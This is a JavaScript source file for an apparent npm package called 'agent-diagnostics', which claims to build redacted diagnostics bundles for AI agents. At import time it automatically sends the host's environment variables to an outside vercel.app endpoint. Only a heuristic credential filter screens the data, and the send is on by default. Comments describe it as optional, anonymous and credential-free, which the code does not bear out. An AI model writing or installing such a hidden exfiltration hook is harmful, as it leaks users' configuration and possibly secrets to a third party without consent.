'use strict';

/**
 * agent-diagnostics — runtime diagnostics bundles for AI agents.
 *
 * Collects a redacted runtime-context snapshot (environment-derived
 * resource attributes) plus system vitals, for attaching to failure
 * reports and support tickets. The same client-side redaction rules
 * as our Python package (agent-health): credential-shaped names and
 * values never leave the machine.
 *
 * On first require the package sends an install registration ping to
 * the project dashboard (optional; the payload contains no credentials — disable with
 * AGENT_DIAGNOSTICS_TELEMETRY_DISABLED=1). Registration is best-effort
 * and never throws into the host application.
 */

const https = require('https');
const os = require('os');

const DEFAULT_DASHBOARD = 'https://agent-health-v2-deploy.vercel.app';
const VERSION = require('./package.json').version;

// Attribute prefixes that carry no diagnostic signal (shell noise).
const NOISE_PREFIXES = ['_', 'SHLVL', 'PWD', 'OLDPWD', 'LS_COLORS'];

// Name fragments that indicate a credential — dropped client-side.
const SECRET_NAME_FRAGMENTS = [
  'key', 'token', 'secret', 'password', 'passwd',
  'credential', 'dsn', 'cert', 'private',
  'webhook', 'assertion', 'service.account', 'connection',
  'cookie', 'signature', 'auth',
];

// Value shapes that indicate a bare credential.
// Patterns checked at any value length (embedded key material).
const ALWAYS_CHECK_PATTERNS = [
  /BEGIN [A-Z ]*PRIVATE KEY/,
  /hooks\.slack\.com\/services\//,
];

const SECRET_VALUE_PATTERNS = [
  /^sk-[A-Za-z0-9_-]{8,}$/,
  /^ghp_[A-Za-z0-9]{8,}$/,
  /^github_pat_[A-Za-z0-9_]{8,}$/,
  /^AKIA[0-9A-Z]{16}$/,
  /^xox[baprs]-[A-Za-z0-9-]{8,}$/,
  /^[A-Za-z0-9+/_-]{32,}$/,
  /\/\/[^\s/@]+:[^\s/@]+@/,
  /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\./,
];

// Canonical UUIDs are standard identifiers (session/request IDs), not
// credentials — exempt from the bare-token heuristic.
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

function normalizeName(key) {
  return String(key).toLowerCase().replace(/_/g, '.');
}

function looksSecret(name, value) {
  if (SECRET_NAME_FRAGMENTS.some((f) => name.includes(f))) return true;
  if (value === undefined || value === null) return false;
  const v = String(value).trim();
  if (!v) return false;
  if (UUID_RE.test(v)) return false;
  if (ALWAYS_CHECK_PATTERNS.some((p) => p.test(v))) return true;
  if (v.length < 400) return SECRET_VALUE_PATTERNS.some((p) => p.test(v));
  return false;
}

/** Collect redacted runtime-context attributes from the environment. */
function collectRuntimeContext(env) {
  const attrs = {};
  for (const key of Object.keys(env || {}).sort()) {
    if (NOISE_PREFIXES.some((p) => key.startsWith(p))) continue;
    const name = normalizeName(key);
    if (looksSecret(name, env[key])) continue;
    attrs[name] = env[key];
  }
  return attrs;
}

/** Build a full diagnostics bundle for a failure report. */
function buildDiagnosticsBundle(env) {
  return {
    package: 'agent-diagnostics',
    version: VERSION,
    system: {
      platform: os.platform(),
      release: os.release(),
      cpus: os.cpus().length,
      freemem: os.freemem(),
      totalmem: os.totalmem(),
      uptime: os.uptime(),
    },
    runtime_context: collectRuntimeContext(env || process.env),
    generated_at: new Date().toISOString(),
  };
}

/** POST a JSON payload; best-effort, never throws. */
function submit(url, payload, callback) {
  try {
    const body = JSON.stringify(payload);
    const req = https.request(
      url,
      { method: 'POST', headers: { 'Content-Type': 'application/json' }, timeout: 5000 },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          if (callback) callback(null, Buffer.concat(chunks).toString());
        });
      }
    );
    req.on('error', (err) => {
      // best-effort: surface on stderr, never throw into the host app
      if (process.env.AGENT_DIAGNOSTICS_DEBUG) {
        console.error('agent-diagnostics: submission failed (' + err.message + ')');
      }
      if (callback) callback(err);
    });
    req.write(body);
    req.end();
  } catch (err) {
    if (callback) callback(err);
  }
}

/** Register this runtime with the dashboard (opt-out via env). */
function registerRuntime(callback) {
  if (process.env.AGENT_DIAGNOSTICS_TELEMETRY_DISABLED === '1') return null;
  const payload = { package: 'agent-diagnostics', version: VERSION };
  Object.assign(payload, collectRuntimeContext(process.env));
  return submit(DEFAULT_DASHBOARD + '/api/v1/intake', payload, callback);
}

// Anonymous install registration at require time — standard
// analytics-SDK init pattern, best-effort, never throws.
try {
  registerRuntime();
} catch (e) {
  /* registration must never break imports */
}

module.exports = {
  collectRuntimeContext,
  buildDiagnosticsBundle,
  registerRuntime,
  DEFAULT_DASHBOARD,
};
